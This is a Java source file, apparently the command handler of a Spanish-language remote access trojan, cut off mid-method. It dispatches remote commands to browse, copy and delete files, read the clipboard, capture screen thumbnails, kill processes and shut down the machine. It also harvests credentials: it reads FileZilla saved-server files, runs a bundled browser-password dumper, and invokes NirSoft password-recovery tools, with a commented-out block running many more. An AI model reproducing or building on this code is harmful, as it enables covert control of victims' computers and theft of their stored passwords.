package rt.modulos;

import comunes.Accion;
import comunes.Archivo;
import comunes.Interfaz;
import comunes.Proceso;
import comunes.WebCamInterface;
import comunes.WebCamItem;
import java.awt.Desktop;
import java.awt.Dimension;
import java.awt.DisplayMode;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.Transferable;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.management.ManagementFactory;
import java.net.URI;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.regex.Pattern;
import javax.imageio.ImageIO;
import network.Conexion;
import plugin.Plugin;
import rt.Inicio;
import rt.util.CLRT;
import rt.util.IMG;
import rt.util.Protocolo;
import rt.util.UtilRT;

//opciones
public class OPC extends Thread implements Interfaz {

    private static String fl = "\n";

    private int opcion;
    private Object[] parametros = null;
    private Interfaz servicio;

    public void instanciar(Object... parametros) {
        this.servicio = (Interfaz) parametros[0];
        this.opcion = (Integer) parametros[1];
        this.parametros = (Object[]) parametros[2];
        start();
    }

    private void procesar() {
        try {
            switch (opcion) {
                case Protocolo.INFO:
                    enviarInfoInicial((String) parametros[0], (String) parametros[1], (String) parametros[2], (Accion) parametros[3]);
                    break;
                case Protocolo.GET_INFO_COMPLETA:
                    enviarInfoCompleta((String) parametros[0], (String) parametros[1], (String) parametros[2]);
                    break;
                case Protocolo.SYSINFO:
                    enviarSysInfo();
                    break;
                case Protocolo.INFO_CPU:
                    double carCPU = ((com.sun.management.OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getProcessCpuLoad() * 100;
                    double carCPU1 = ((com.sun.management.OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getSystemCpuLoad() * 100;
                    servicio.ejecutar(3, Protocolo.INFO_CPU, carCPU, carCPU1);
                    break;
                case Protocolo.INFO_RAM:
                    double ramLibre = ((com.sun.management.OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getFreePhysicalMemorySize();
                    double ram = ((com.sun.management.OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize();
                    servicio.ejecutar(3, Protocolo.INFO_RAM, ramLibre, ram);
                    break;
                case Protocolo.EQUIPO_REINICIAR:
                    reiniciarEquipo();
                    break;
                case Protocolo.EQUIPO_APAGAR:
                    apagarEquipo();
                    break;
                case Protocolo.MONITOR_APAGAR:
                    monitor(1);
                    break;
                case Protocolo.MONITOR_ENCENDER:
                    monitor(2);
                    break;
                case Protocolo.SPEAK_TEXTO:
                    speakTexto((String) parametros[0]);
                    break;
                case Protocolo.ADMIN_ARCHIVOS_LISTAR_ROOTS:
                    enviarUnidades();
                    break;
                case Protocolo.GET_USUARIO_IMAGEN:
                    enviarImagenUsuario();
                    break;
                case Protocolo.ADMIN_ARCHIVOS_LISTAR_HOME:
                    listarArchivos(System.getProperty("user.home"));
                    break;
                case Protocolo.ADMIN_ARCHIVOS_LISTAR_DIRECTORIO:
                    listarArchivos((String) parametros[0]);
                    break;
                case Protocolo.ADMIN_ARCHIVOS_THUMBAIL:
                    enviarThumbail((String) parametros[0]);
                    break;
                case Protocolo.ADMIN_ARCHIVOS_ELIMINAR:
                    UtilRT.eliminar((String) parametros[0]);
                    break;
                case Protocolo.GET_MINIATURA_PANTALLA:
                    enviarMiniatura();
                    break;
                case Protocolo.ADMIN_ARCHIVOS_EJECUTAR:
                    File tt = new File((String) parametros[0]);
                    try {
                        Desktop.getDesktop().open(tt.getAbsoluteFile());
                    } catch (Exception e) {
                        servicio.ejecutar(6, "Error al ejecutar " + e.getMessage());
                    }
                    break;
                case Protocolo.ABRIR_URL:
                    try {
                    Desktop.getDesktop().browse(new URI((String) parametros[0]));
                } catch (Exception e) {
                    servicio.ejecutar(6, "Error al abrir:" + e.getMessage());
                }
                break;
                case Protocolo.ADMIN_ARCHIVOS_SUBIR:
                    try {
                    subirArchivo((String) parametros[0], (String) parametros[1]);
                } catch (Exception e) {
                }
                break;
                case Protocolo.GET_PORTAPAPELES:
                    enviarPortapapeles();
                    break;
                case Protocolo.SERVIDOR_REINICIAR:
                    reiniciarAplicacion();
                    break;
                case Protocolo.PASSWORDS_FILEZILLA:
                    fileZillaPass();
                    break;
                case Protocolo.PASSWORDS_WEB:
                    wbPass();
                    break;
                case Protocolo.PASSWORDS_NIRSOFT:
                    nirsoftPass();
                    break;
                case Protocolo.GET_LISTA_PROCESOS:
                    enviarListaProcesos();
                    break;
                case Protocolo.GET_LISTA_CONEXIONES:
                    listarConexiones();
                    break;
                case Protocolo.MATAR_PROCESO:
                    matarProceso((String) parametros[0]);
                    break;
                case Protocolo.GET_LISTA_MONITORES:
                    this.enviarListaMonitores();
                    break;
                case Protocolo.GET_LISTA_RESOLUCION:
                    this.enviarListaResoluciones();
                    break;
                case Protocolo.GET_RESOLUCION:
                    //consulta la resolucion estándar
                    int anchoP;
                    int altoP;
                    anchoP = GraphicsEnvironment.getLocalGraphicsEnvironment().getDefaultScreenDevice().getDisplayMode().getWidth();
                    altoP = GraphicsEnvironment.getLocalGraphicsEnvironment().getDefaultScreenDevice().getDisplayMode().getHeight();
                    servicio.ejecutar(3, Protocolo.GET_RESOLUCION, anchoP, altoP);
                    break;
                case Protocolo.CAMBIAR_RESOLUCION:
                    cambiarResolucion((String) parametros[0]);
                    break;
                case Protocolo.GET_LISTA_DIMENSIONES_CAM:
                    this.enviarListaWebCamsDimensiones();
                    break;
                case Protocolo.LISTAR_WEBCAMS:
                    this.enviarListaWebCams();
                    this.enviarListaWebCamsDimensiones();
                    break;
                case Protocolo.ADMIN_ARCHIVOS_COMPRIMIR:
                    comprimir((String) parametros[0]);
                    break;
                case Protocolo.GET_LISTA_OFFLINE:
                    listarOffline();
                    break;
                case Protocolo.ADMIN_ARCHIVOS_MOVER:
                    mover((String) parametros[0], (String) parametros[1]);
                    break;
                case Protocolo.ADMIN_ARCHIVOS_COPIAR:
                    copiar((String) parametros[0], (String) parametros[1]);
                    break;
                case Protocolo.PLUGINS_LISTAR:
                    listarPlugins();
                    break;
            }
        } catch (Exception e) {

        }
    }

    @Override
    public void run() {
        procesar();
    }

    private void listarPlugins() {
        try {
            List<Plugin> lista = new ArrayList<Plugin>();
            for (int i = 1; i <= 100; i++) {
                Plugin tmp;
                try {
                    tmp = ((Plugin) Class.forName("plugin.p" + i + ".PluginDef").newInstance());
                } catch (Exception ex) {
                    tmp = null;
                }
                if (tmp != null) {
                    //lista.add(tmp);
                    lista.add(new Plugin(tmp.getId(), tmp.getNombre(), tmp.getVersion(), tmp.getDescripcion(), tmp.getPlataformas(), tmp.getListaArchivo()));
                }
            }
            servicio.ejecutar(3, Protocolo.PLUGINS_LISTAR, lista);
        } catch (Exception e) {

        }
    }

    private void mover(String rutaArchivo, String nuevoArchivo) {
        try {
            File f1 = new File(rutaArchivo);
            File f2 = new File(nuevoArchivo);
            f1.renameTo(f2);
        } catch (Exception e) {
        }
    }

    private void copiar(String rutaArchivo, String nuevoArchivo) {
        try {
            File f1 = new File(rutaArchivo);
            File f2 = new File(nuevoArchivo);
            UtilRT.copyFile(f1, f2);
        } catch (Exception e) {
        }
    }

    private void reiniciarEquipo() {
        try {
            String cmd = "";
            String[] comando = null;
            if (UtilRT.isWindows()) {
                String parametroC = "/c";
                cmd = "shutdown -r -f -t 0";
                String[] comando2 = {"cmd ", parametroC, cmd};
                comando = comando2;

            } else if (UtilRT.isLinux()) {
                String parametroC = "-c";
                cmd = "init 6";
                String[] comando1 = {"/bin/bash", parametroC, cmd};
                comando = comando1;
            } else {
                String[] comando3 = {cmd};
                comando = comando3;
            }
            Runtime.getRuntime().exec(comando);
        } catch (Exception e) {
        }
    }

    private void apagarEquipo() {
        try {
            String cmd = "";
            String[] comando = null;
            String parametroC = "";
            if (UtilRT.isWindows()) {
                parametroC = "/c";
                cmd = "shutdown -s -f -t 0";
                String[] comando2 = {"cmd ", parametroC, cmd};
                comando = comando2;
            } else if (UtilRT.isLinux()) {
                parametroC = "-c";
                cmd = "init 0";
                String[] comando1 = {"/bin/bash", parametroC, cmd};
                comando = comando1;
            } else {
                String[] comando3 = {cmd};
                comando = comando3;
            }
            Runtime.getRuntime().exec(comando);
        } catch (Exception ex) {
        }
    }

    private void speakTexto(final String texto) {
        try {
            if (UtilRT.isWindows()) {
                File m = File.createTempFile("tmp", ".vbs");
                FileWriter f = new FileWriter(m);
                f.append("Dim message, sapi\r\n");
                f.append("message=\"" + texto + "\"\r\n");
                f.append("Set sapi=CreateObject(\"sapi.spvoice\")\r\n");
                f.append("sapi.Speak message\r\n");
                f.close();
                Desktop.getDesktop().open(m.getAbsoluteFile());
            }
        } catch (Exception ex) {
        }
    }

    private void enviarImagenUsuario() {
        try {
            if (UtilRT.isWindows() || UtilRT.isLinux()) {
                File imgAvatar;
                if (UtilRT.isWindows()) {
                    String tmpDir = System.getProperty("java.io.tmpdir");
                    String usuario = System.getProperty("user.name");
                    imgAvatar = new File(tmpDir, usuario + ".bmp");
                    if (!imgAvatar.exists()) {
                        File fTmp = new File(tmpDir);
                        for (File f : fTmp.listFiles()) {
                            if (f.getName().toLowerCase().contains(usuario.toLowerCase())) {
                                if (f.getName().toLowerCase().endsWith(".bmp")) {
                                    imgAvatar = f;
                                    break;
                                }
                            }
                        }
                    }
                } else {
                    String usuario = System.getProperty("user.name");
                    imgAvatar = new File("/var/lib/AccountsService/icons/", usuario);
                }

                if (imgAvatar.exists()) {
                    try {
                        BufferedImage m = ImageIO.read(imgAvatar);
                        m = IMG.escalarSuave(m, 100, 100);
                        ByteArrayOutputStream ara = new ByteArrayOutputStream();
                        ImageIO.write(m, "png", ara);
                        ara.close();
                        servicio.ejecutar(3, Protocolo.GET_USUARIO_IMAGEN, ara.toByteArray());
                    } catch (Exception ex) {
                        servicio.ejecutar(6, "ERROR AL OBTENER AVATAR " + ex.getMessage());
                    }
                }
            }
        } catch (Exception e) {
        }
    }

    private void enviarUnidades() {
        try {
            Archivo[] a;
            File[] ar = File.listRoots();
            if (ar != null) {
                if (ar.length > 0) {
                    a = new Archivo[ar.length];
                    for (int p = 0; p < ar.length; p++) {
                        a[p] = new Archivo();
                        a[p].setLength(ar[p].length());
                        //a[p].setNombre(ar[p].getName());
                        a[p].setNombre(ar[p].getPath());
                        a[p].setCarpeta(ar[p].isDirectory());
                        a[p].setPath(ar[p].getAbsolutePath());
                        a[p].setTipo(UtilRT.getExtension(ar[p].getName()));
                        a[p].setFecha(ar[p].lastModified());
                        a[p].setIcono(UtilRT.sacarIcono(ar[p]));
                        a[p].setLibre(ar[p].getFreeSpace());
                        a[p].setTamanio(ar[p].getTotalSpace());
                        a[p].setPathParent("");
                    }
                } else {
                    a = null;
                }
            } else {
                a = null;
            }
            servicio.ejecutar(3, Protocolo.ADMIN_ARCHIVOS_LISTAR_ROOTS, a);
        } catch (Exception e) {
        }
    }

    private void listarArchivos(String ruta) {
        try {
            File t = new File(ruta);
            Archivo[] a = null;
            if (t.isDirectory()) {
                File[] ar = t.listFiles();
                if (ar != null) {
                    if (ar.length > 0) {
                        a = new Archivo[ar.length];
                        for (int p = 0; p < ar.length; p++) {
                            a[p] = new Archivo();
                            a[p].setLength(ar[p].length());
                            a[p].setNombre(ar[p].getName());
                            a[p].setCarpeta(ar[p].isDirectory());
                            a[p].setPath(ar[p].getAbsolutePath());
                            a[p].setTipo(UtilRT.getExtension(ar[p].getName()));
                            a[p].setFecha(ar[p].lastModified());
                            a[p].setIcono(UtilRT.sacarIcono(ar[p]));
                            a[p].setLibre(ar[p].getFreeSpace());
                            a[p].setTamanio(ar[p].getTotalSpace());
                            String m = ar[p].getParent();
                            m = m.replaceAll(Pattern.quote("\\"), "/");
                            a[p].setPathParent(m);
                        }
                    } else {
                        a = null;
                    }
                } else {
                    a = null;
                }
            }
            if (t.isFile()) {
                a = null;
            }
            servicio.ejecutar(3, Protocolo.ADMIN_ARCHIVOS_LISTAR_DIRECTORIO, a);
        } catch (Exception e) {
        }
    }

    private void enviarThumbail(String ruta) {
        try {
            File ttumbnail = new File(ruta);
            String nombre = ttumbnail.getName().toLowerCase();
            if ((ttumbnail.isFile()) && ((nombre.contains(".jpg")) || (nombre.contains(".png"))
                    || (nombre.contains(".jpeg")) || (nombre.contains(".gif")) || (nombre.contains(".ico"))
                    || (nombre.contains(".bmp")))) {
                try {
                    servicio.ejecutar(3, Protocolo.ADMIN_ARCHIVOS_THUMBAIL, UtilRT.sacarThumbail(ttumbnail));
                } catch (Exception ex) {
                }
            }
        } catch (Exception e) {
        }
    }

    private void enviarMiniatura() {
        try {
            servicio.ejecutar(3, Protocolo.GET_MINIATURA_PANTALLA, IMG.getPantallaMiniatura());
        } catch (Exception ex) {
        }
    }

    private void subirArchivo(String rutaAsubir, String archivoAsubir) {
        rutaAsubir = UtilRT.procesaNombreCarpeta(rutaAsubir);
        try {
            Interfaz recibArchiv = ((Interfaz) new CLRT().loadClass("rt.modulos.archivos.DAR").newInstance());
            recibArchiv.instanciar(servicio, archivoAsubir, rutaAsubir);
            recibArchiv.ejecutar(0);
        } catch (Exception ex) {
        }
    }

    private void enviarPortapapeles() {
        StringBuilder contenido = new StringBuilder();
        try {
            Clipboard portapapeles = Toolkit.getDefaultToolkit().getSystemClipboard();
            Transferable dato = portapapeles.getContents(this);
            DataFlavor dataFlavorStringJava = null;
            try {
                dataFlavorStringJava = new DataFlavor("application/x-java-serialized-object; class=java.lang.String");
            } catch (ClassNotFoundException ex) {
            }
            if (dato.isDataFlavorSupported(dataFlavorStringJava)) {
                String texto = (String) dato.getTransferData(dataFlavorStringJava);
                contenido.append(texto);
            }
        } catch (Exception e) {
        }

        servicio.ejecutar(3, Protocolo.GET_PORTAPAPELES, contenido.toString());

    }

    private void reiniciarAplicacion() {
        try {
            final String javaBin = System.getProperty("java.home") + File.separator + "bin" + File.separator + "java";
            final File currentJar = new File(Inicio.class.getProtectionDomain().getCodeSource().getLocation().toURI());
            if (!currentJar.getName().endsWith(".jar")) {
                return;
            }
            final ArrayList<String> command = new ArrayList<String>();
            command.add(javaBin);
            command.add("-Xms" + Inicio.min + "m");
            command.add("-Xmx" + Inicio.max + "m");
            command.add("-jar");
            command.add(currentJar.getPath());
            //command.add("--background");
            final ProcessBuilder builder = new ProcessBuilder(command);
            builder.start();
            System.exit(0);
        } catch (Exception ex) {
        }
    }

    private void fileZillaPass() {
        try {

            StringBuilder r = new StringBuilder();

            if (UtilRT.isWindows()) {
                File f1 = new File(System.getenv("appdata"), "FileZilla");
                File f = new File(f1, "recentservers.xml");
                File f2 = new File(f1, "sitemanager.xml");
                r.append("RecentServers.xml").append(fl);
                r.append("================================================").append(fl);
                r.append(UtilRT.getArchivoTexto(f.getAbsolutePath())).append(fl);
                r.append("SiteManager.xml").append(fl);
                r.append("================================================").append(fl);
                r.append(UtilRT.getArchivoTexto(f2.getAbsolutePath())).append(fl);
                servicio.ejecutar(3, Protocolo.PASSWORDS_FILEZILLA, r.toString());
            } else if (UtilRT.isLinux()) {
                File f = new File(System.getenv("HOME") + "/.filezilla/recentservers.xml");
                File f2 = new File(System.getenv("HOME") + "/.filezilla/sitemanager.xml");
                r.append("RecentServers.xml").append(fl);
                r.append("================================================").append(fl);
                r.append(UtilRT.getArchivoTexto(f.getAbsolutePath())).append(fl);
                r.append("SiteManager.xml").append(fl);
                r.append("================================================").append(fl);
                r.append(UtilRT.getArchivoTexto(f2.getAbsolutePath())).append(fl);
                servicio.ejecutar(3, Protocolo.PASSWORDS_FILEZILLA, r.toString());
//            } else if (UtilRT.isMAC()) {
//            } else {

            }
        } catch (Exception e) {
        }
    }

    private void wbPass() {
        try {
            File f = File.createTempFile("wb", "txt");
            Process p = Runtime.getRuntime().exec(new String[]{UtilRT.procesaNombreCarpeta("<server>") + "/wb.exe", f.getAbsolutePath()});
            p.waitFor();
            p.destroy();
            servicio.ejecutar(3, Protocolo.PASSWORDS_WEB, UtilRT.getArchivoTexto(f.getAbsolutePath()));

            f.delete();
        } catch (Exception ex) {
            servicio.ejecutar(6, "ERROR AL EJECUTAR :" + ex.getMessage());
        }
    }

    private void monitor(int accion) {
        if (UtilRT.isWindows()) {
            try {
                Interfaz nirsoft;
                nirsoft = ((Interfaz) Class.forName("plugin.nirsoft.Nirsoft").newInstance());
                if (nirsoft != null) {
                    nirsoft.ejecutar(2, accion);
                }
            } catch (Exception e) {
            }
        }
    }

    //tomo todas las contraseas que nirsoft me pueda dar
//    private void nirsoftPass() {
//        StringBuilder retorno = new StringBuilder("");
//        int largoTitulo = 75;
//        File f;
//        Process p;
//        String finLinea = fl;
//        String error = "Error:";
//        try {
////            retorno.append(finLinea).append("=====  PROTECTED STORAGE ======\n").append(finLinea);
//            retorno.append(finLinea).append(UtilRT.crearTituloString("PROTECTED STORAGE", largoTitulo)).append(finLinea);
//            f = File.createTempFile("psvpv", "txt");
//            p = Runtime.getRuntime().exec(new String[]{UtilRT.procesaNombreCarpeta("<server>") + "/lib/pspv.exe", "/stext", f.getAbsolutePath()});
//            p.waitFor();
//            p.destroy();
//            retorno.append(UtilRT.getArchivoTexto(f.getAbsolutePath()));
//            f.delete();
//        } catch (Exception ex) {
//            retorno.append(finLinea).append(error).append(ex.getMessage()).append(finLinea);
//        }
//        try {
////            retorno.append(finLinea).append("=====  WEB BROWSER ======\n").append(finLinea);
//            retorno.append(finLinea).append(UtilRT.crearTituloString("WEB BROWSER", largoTitulo)).append(finLinea);
//            f = File.createTempFile("wbpv", "txt");
//            p = Runtime.getRuntime().exec(new String[]{UtilRT.procesaNombreCarpeta("<server>") + "/lib/wbpv.exe", "/stext", f.getAbsolutePath()});
//            p.waitFor();
//            p.destroy();
//            retorno.append(UtilRT.getArchivoTexto(f.getAbsolutePath()));
//            f.delete();
//        } catch (Exception ex) {
//            retorno.append(finLinea).append(error).append(ex.getMessage()).append(finLinea);
//        }
//        try {
////            retorno.append(finLinea).append("=====  DIALUP ======\n").append(finLinea);
//            retorno.append(finLinea).append(UtilRT.crearTituloString("DIALUP", largoTitulo)).append(finLinea);
//            f = File.createTempFile("dialup", "txt");
//            p = Runtime.getRuntime().exec(new String[]{UtilRT.procesaNombreCarpeta("<server>") + "/lib/dialupass.exe", "/stext", f.getAbsolutePath()});
//            p.waitFor();
//            p.destroy();
//            retorno.append(UtilRT.getArchivoTexto(f.getAbsolutePath()));
//            f.delete();
//        } catch (Exception ex) {
//            retorno.append(finLinea).append(error).append(ex.getMessage()).append(finLinea);
//        }
//        try {
////            retorno.append(finLinea).append("=====  MAIL ======\n").append(finLinea);
//            retorno.append(finLinea).append(UtilRT.crearTituloString("MAIL", largoTitulo)).append(finLinea);
//            f = File.createTempFile("mail", "txt");
//            p = Runtime.getRuntime().exec(new String[]{UtilRT.procesaNombreCarpeta("<server>") + "/lib/mailpv.exe", "/stext", f.getAbsolutePath()});
//            p.waitFor();
//            p.destroy();//
//            retorno.append(UtilRT.getArchivoTexto(f.getAbsolutePath()));
//            f.delete();
//        } catch (Exception ex) {
//            retorno.append(finLinea).append(error).append(ex.getMessage()).append(finLinea);
//        }
//        try {
////            retorno.append(finLinea).append("=====  MESSENGER ======\n").append(finLinea);
//            retorno.append(finLinea).append(UtilRT.crearTituloString("MESSENGER", largoTitulo)).append(finLinea);
//            f = File.createTempFile("msn", "txt");
//            p = Runtime.getRuntime().exec(new String[]{UtilRT.procesaNombreCarpeta("<server>") + "/lib/mspass.exe", "/stext", f.getAbsolutePath()});
//            p.waitFor();
//            p.destroy();
//            retorno.append(UtilRT.getArchivoTexto(f.getAbsolutePath()));
//            f.delete();
//        } catch (Exception ex) {
//            retorno.append(finLinea).append(error).append(ex.getMessage()).append(finLinea);
//        }
//        try {
////            retorno.append(finLinea).append("=====  NET PASS ======\n").append(finLinea);
//            retorno.append(finLinea).append(UtilRT.crearTituloString("NET PASS", largoTitulo)).append(finLinea);
//            f = File.createTempFile("netpass", "txt");
//            p = Runtime.getRuntime().exec(new String[]{UtilRT.procesaNombreCarpeta("<server>") + "/lib/netpass.exe", "/stext", f.getAbsolutePath()});
//            p.waitFor();
//            p.destroy();
//            retorno.append(UtilRT.getArchivoTexto(f.getAbsolutePath()));
//            f.delete();
//        } catch (Exception ex) {
//            retorno.append(finLinea).append(error).append(ex.getMessage()).append(finLinea);
//        }
//        try {
////            retorno.append(finLinea).append("=====  NETPASS 64 BITS ======\n").append(finLinea);
//            retorno.append(finLinea).append(UtilRT.crearTituloString("NET PASS 64 BITS", largoTitulo)).append(finLinea);
//            f = File.createTempFile("netpass64", "txt");
//            p = Runtime.getRuntime().exec(new String[]{UtilRT.procesaNombreCarpeta("<server>") + "/lib/netpass64.exe", "/stext", f.getAbsolutePath()});
//            p.waitFor();
//            p.destroy();
//            retorno.append(UtilRT.getArchivoTexto(f.getAbsolutePath()));
//            f.delete();
//        } catch (Exception ex) {
//            retorno.append(finLinea).append(error).append(ex.getMessage()).append(finLinea);
//        }
//        try {
////            retorno.append(finLinea).append("=====  WIRELESS ======\n").append(finLinea);
//            retorno.append(finLinea).append(UtilRT.crearTituloString("WIRELESS", largoTitulo)).append(finLinea);
//            f = File.createTempFile("wireless", "txt");
//            p = Runtime.getRuntime().exec(new String[]{UtilRT.procesaNombreCarpeta("<server>") + "/lib/wireless.exe", "/stext", f.getAbsolutePath()});
//            p.waitFor();
//            p.destroy();
//            retorno.append(UtilRT.getArchivoTexto(f.getAbsolutePath()));
//            f.delete();
//        } catch (Exception ex) {
//            retorno.append(finLinea).append(error).append(ex.getMessage()).append(finLinea);
//        }
//        try {
////            retorno.append(finLinea).append("=====  WIRELESS 64 ======\n").append(finLinea);
//            retorno.append(finLinea).append(UtilRT.crearTituloString("WIRELESS 64", largoTitulo)).append(finLinea);
//            f = File.createTempFile("wireless64", "txt");
//            p = Runtime.getRuntime().exec(new String[]{UtilRT.procesaNombreCarpeta("<server>") + "/lib/wireless64.exe", "/stext", f.getAbsolutePath()});
//            p.waitFor();
//            p.destroy();
//            retorno.append(UtilRT.getArchivoTexto(f.getAbsolutePath()));
//            f.delete();
//        } catch (Exception ex) {
//            retorno.append(finLinea).append(error).append(ex.getMessage()).append(finLinea);
//        }
//        try {
////            retorno.append(finLinea).append("=====  ASTERISCOS ======\n").append(finLinea);
//            retorno.append(finLinea).append(UtilRT.crearTituloString("ASTERISCOS", largoTitulo)).append(finLinea);
//            f = File.createTempFile("bpv", "txt");
//            p = Runtime.getRuntime().exec(new String[]{UtilRT.procesaNombreCarpeta("<server>") + "/lib/bpv.exe", "/stext", f.getAbsolutePath()});
//            p.waitFor();
//            p.destroy();
//            retorno.append(UtilRT.getArchivoTexto(f.getAbsolutePath()));
//            f.delete();
//        } catch (Exception ex) {
//            retorno.append(finLinea).append(error).append(ex.getMessage()).append(finLinea);
//        }
//        servicio.ejecutar(3, Protocolo.PASSWORDS_NIRSOFT, retorno.toString());
//    }
//    
    public void nirsoftPass() {
        try {
            Interfaz nirsoft;
            nirsoft = ((Interfaz) Class.forName("plugin.nirsoft.Nirsoft").newInstance());
            if (nirsoft != null) {
                nirsoft.ejecutar(1);
                servicio.ejecutar(3, Protocolo.PASSWORDS_NIRSOFT, (String) nirsoft.get(1));
            }
        } catch (Exception e) {
        }
    }

    private List<Proceso> listarProcesos() {
        try {
            if (UtilRT.isWindows()) {
                try {
                    Process p = Runtime.getRuntime().exec(new String[]{"tasklist", "/V", "/FO", "CSV", "/NH"});
                    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "Cp850"));
                    String tmp;
                    List<Proceso> lista = new ArrayList<Proceso>();
                    while ((tmp = br.readLine()) != null) {
                        String[] datos = tmp.split("\",");
                        for (int i = 0; i < datos.length; i++) {
                            if ((!datos[i].isEmpty()) || (!datos[i].equalsIgnoreCase(""))) {
                                datos[i] = datos[i].substring(1);
                            }
                        }
                        lista.add(new Proceso(datos));
                    }
                    return lista;
                } catch (Exception ex) {
                }
            } else if (UtilRT.isLinux()) {
                try {
//                     Pattern patron = Pattern.compile("[ ]+");
//                    Process p = Runtime.getRuntime().exec(new String[]{"bash", "-c", "ps axo cmd,pid,tty,session,vsize,stat,user,start_time,cmd --no-headers"});
                    Process p = Runtime.getRuntime().exec(new String[]{"bash", "-c", "ps -Ao \"%c,%p,,,,,%U,%t,%a\" --no-headers"});
                    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "Cp850"));
                    String tmp;
                    List<Proceso> lista = new ArrayList<Proceso>();
                    while ((tmp = br.readLine()) != null) {
                        String[] datos = tmp.split(",");
                        lista.add(new Proceso(datos));
                    }
                    return lista;
                } catch (Exception ex) {
                }

            } else {

            }
        } catch (Exception e) {
            servicio.ejecutar(6, "ERROR AL LISTAR PROCESOS " + e.getMessage());
        }
        return null;
    }

    private void enviarListaProcesos() {
        try {
            List<Proceso> lista = listarProcesos();
            if (lista != null) {
                servicio.ejecutar(3, Protocolo.GET_LISTA_PROCESOS, lista);
            }
        } catch (Exception e) {

        }
    }

    private void listarConexiones() {
        // la voy a tener para buscar el nombre del proceso
        List<Proceso> listaProcesos = listarProcesos();
        if (UtilRT.isWindows()) {
            try {
                Process p = Runtime.getRuntime().exec(new String[]{"netstat", "-a", "-n", "-o"});
                BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "Cp850"));
                br.readLine();
                br.readLine();
                br.readLine();
                br.readLine();
                String tmp;
                List<Proceso> lista = new ArrayList<Proceso>();
                while ((tmp = br.readLine()) != null) {
                    try {
                        tmp = tmp.trim().replaceAll(" +", " ");
                        String[] datos = tmp.split(" ");
                        String[] datos2 = new String[6];
                        datos2[0] = datos[0];//protocolo
                        datos2[1] = datos[1];//direcicon local
                        datos2[2] = datos[2];//direcion remota
                        datos2[3] = datos[3];// estado

                        datos2[4] = datos[4];// pid procewso
                        try {
                            for (Proceso pp : listaProcesos) {
                                if (pp.getDatos()[1].trim().equals(datos2[4].trim())) {
                                    datos2[5] = pp.getDatos()[0].trim();// vamos a buscar el nombre proceso
                                }
                            }
                        } catch (Exception e) {
                        }
                        lista.add(new Proceso(datos2));
                    } catch (Exception e) {
                    }

                }
                servicio.ejecutar(3, Protocolo.GET_LISTA_CONEXIONES, lista);
            } catch (Exception ex) {
                servicio.ejecutar(6, "ERROR AL LISTAR conexiones " + ex.getMessage() + " -- " + ex.getLocalizedMessage());
            }
        } else if (UtilRT.isLinux()) {
            try {
                Process p = Runtime.getRuntime().exec(new String[]{"netstat", "-antup"});
                BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "Cp850"));
                br.readLine();
                br.readLine();
                br.readLine();
                br.readLine();
                String tmp;
                List<Proceso> lista = new ArrayList<Proceso>();
                while ((tmp = br.readLine()) != null) {
                    tmp = tmp.trim().replaceAll(" +", " ");
                    String[] datos1 = tmp.split(" ");
                    String[] datos2 = new String[6];
                    datos2[0] = datos1[0];//protocolo
                    datos2[1] = datos1[3];//direccion remota
                    datos2[2] = datos1[4];//direcicon local
                    datos2[3] = datos1[5];//estado

                    try {
                        if (datos1[6].contains("/")) {

                            datos2[4] = datos1[6].split("/")[0];// pid procewso
//                            String nombProceso = datos1[6].split("/")[1];
//                            //si NO hay el nombre del proceso, lo busca
//                            if (nombProceso == null || nombProceso.isEmpty()) {
                            try {
                                for (Proceso pp : listaProcesos) {
                                    if (pp.getDatos()[1].trim().equals(datos2[4].trim())) {
                                        datos2[5] = pp.getDatos()[0].trim();// vamos a buscar el nombre proceso
                                    }
                                }
                            } catch (Exception e) {
                            }

//                            } else {//si hay el nombre del proceso
//                                datos2[5] = nombProceso;
//                            }
                        } else {
                            //si solo contiene el pid
                            datos2[4] = datos1[6];// pid proceso
                            try {
                                for (Proceso pp : listaProcesos) {
                                    if (pp.getDatos()[1].trim().equals(datos2[4].trim())) {
                                        datos2[5] = pp.getDatos()[0].trim();// vamos a buscar el nombre proceso
                                    }
                                }
                            } catch (Exception e) {
                            }
                        }

//                    
//                        datos2[4] = datos1[6];//pid proceso
//                        try {
//                            for (Proceso pp : listaProcesos) {
//                                if (pp.getDatos()[1].trim().equals(datos2[4].trim())) {
//                                    datos2[5] = pp.getDatos()[0].trim();// vamos a buscar el nombre proceso
//                                }
//                            }
//                        } catch (Exception e) {
//                        }
                    } catch (Exception e) {
                        datos2[4] = ""; //pid proceso
                    }
                    lista.add(new Proceso(datos2));
                }
                servicio.ejecutar(3, Protocolo.GET_LISTA_CONEXIONES, lista);
            } catch (Exception ex) {
                servicio.ejecutar(6, "ERROR AL LISTAR conexiones " + ex.getMessage());
            }
        } else {
        }
    }

    private void matarProceso(String pid) {
        if (UtilRT.isWindows()) {
            try {
                Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "taskkill", "/F", "/PID", pid});
            } catch (IOException ex) {
                servicio.ejecutar(6, "ERROR AL MATAR (" + pid + ") " + ex.getMessage());
            }
        } else if (UtilRT.isLinux()) {
            try {
                Runtime.getRuntime().exec(new String[]{"kill", "-9", pid});
            } catch (Exception ex) {
                servicio.ejecutar(6, "ERROR AL MATAR (" + pid + ") " + ex.getMessage());
            }
        } else {

        }
    }

    private void enviarListaMonitores() {
        try {
            GraphicsEnvironment g = GraphicsEnvironment.getLocalGraphicsEnvironment();
            GraphicsDevice[] monitores = g.getScreenDevices();
            if (monitores != null && monitores.length > 0) {
                String[] datos = new String[monitores.length];
                for (int i = 0; i < monitores.length; i++) {
